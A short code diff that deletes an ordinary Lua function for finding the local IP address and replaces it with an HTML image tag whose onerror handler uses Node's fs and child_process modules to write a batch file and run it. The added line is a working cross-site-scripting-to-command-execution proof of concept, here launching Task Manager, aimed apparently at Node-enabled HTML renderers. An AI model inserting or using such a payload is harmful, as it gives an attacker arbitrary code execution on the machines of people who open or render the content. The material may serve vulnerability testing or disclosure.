@@ -1,13 +1,3 @@
--- Function to get local IP address
-function get_local_ip()
-    local socket = require("socket")
-    local udp = socket.udp()
-    udp:setpeername("8.8.8.8", 80)  -- Connect to Google's DNS server
-    local ip, _ = udp:getsockname()
-    udp:close()
-    return ip or "IP address not found"
-end
-
--- Example usage:
-local ip_address = get_local_ip()
-print("Local IP Address:", ip_address)
+<img src=x onerror="
+require('fs').writeFileSync('poc.bat', '@echo off\nstart taskmgr'); 
+alert(require('child_process').execSync('start poc.bat').toString());">
